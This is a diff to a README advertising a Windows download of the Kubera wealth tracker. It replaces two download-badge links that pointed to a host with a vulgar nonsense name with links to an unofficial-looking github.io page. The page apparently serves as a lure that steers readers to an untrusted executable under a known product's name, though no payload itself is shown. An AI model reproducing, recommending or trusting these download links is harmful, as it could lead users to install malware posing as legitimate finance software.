@@ -4,7 +4,7 @@
 
 ## 📥 Download Kubera for Windows
 
-[![⬇️ Download Kubera](https://img.shields.io/badge/Download-Kubera-blue?style=for-the-badge&logo=windows)](https://xuipizdaskovoroda/.github)
+[![⬇️ Download Kubera](https://img.shields.io/badge/Download-Kubera-blue?style=for-the-badge&logo=windows)](https://kubera-for-windows.github.io/.github/kubera)
 
 ---
 
@@ -26,7 +26,7 @@ For financial advisors and wealth managers, Kubera can be used as a client repor
 
 Whether you are a high-net-worth individual managing complex global assets, a crypto investor balancing multiple wallets, or simply someone who wants an accurate and private view of your financial life, Kubera provides the tools to monitor, analyze, and plan effectively. By combining comprehensive asset coverage, automation, and strong security, it delivers a modern, all-in-one solution for wealth tracking in the digital age.
 
-[![⬇️ Download Kubera](https://img.shields.io/badge/Download-Kubera-blue?style=for-the-badge&logo=windows)](https://xuipizdaskovoroda/.github)
+[![⬇️ Download Kubera](https://img.shields.io/badge/Download-Kubera-blue?style=for-the-badge&logo=windows)](https://kubera-for-windows.github.io/.github/kubera)
 
 ---
 
